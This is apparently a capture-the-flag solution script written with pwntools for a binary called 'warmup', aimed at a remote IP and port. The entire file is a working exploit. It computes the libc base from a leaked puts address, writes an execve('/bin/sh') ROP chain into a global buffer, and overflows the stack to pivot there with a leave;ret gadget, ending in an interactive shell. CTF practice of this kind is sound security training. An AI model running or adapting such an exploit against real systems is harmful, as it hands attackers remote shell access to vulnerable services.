from pwn import *

# p = process('./warmup')
p = remote('172.210.129.230', 1338)
e = ELF('./warmup')
libc = ELF('./libc.so.6')
context.arch = 'amd64'

libc.address = int(p.recvline()[:-1], 16) - libc.symbols['puts']
log.info(f'libc: {hex(libc.address)}')

# 0x10f75b: pop rdi ; ret ;
# 0x110a4d: pop rsi ; ret ;
# 0xdd237: pop rax ; ret ;
# 0xa0d6f: xor edx, edx ; syscall ;
addr_arg = next(libc.search(b'/bin/sh'))
rop_leave = next(e.search(asm('leave; ret')))
rop_pop_rdi = libc.address + 0x10f75b
rop_pop_rsi = libc.address + 0x110a4d
rop_pop_rax = libc.address + 0xdd237
rop_xor_edx_syscall = libc.address + 0xa0d6f
payload = flat([
    rop_pop_rdi, addr_arg,
    rop_pop_rsi, 0,
    rop_pop_rax, constants.SYS_execve,
    rop_xor_edx_syscall
])
p.sendline(payload)

payload = b'A'*0x40
payload += p64(e.symbols['name']-8)
payload += p64(rop_leave)
p.sendline(payload)
p.interactive()
